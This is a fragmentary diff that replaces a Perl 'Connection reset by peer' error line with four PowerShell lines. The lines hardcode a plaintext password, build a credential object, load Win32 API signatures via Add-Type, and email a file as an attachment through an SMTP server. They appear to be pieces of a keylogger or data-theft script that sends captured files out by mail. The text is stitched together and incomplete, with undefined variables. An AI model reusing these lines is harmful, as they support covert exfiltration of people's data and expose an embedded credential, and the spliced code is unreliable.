@@ -1,1 +1,4 @@
-Status read failed: Connection reset by peer at /usr/share/perl5/Net/HTTP/Methods.pm line 288.
+$Pass = "yjghfdafsd5464562!"
+$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
+  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+	send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
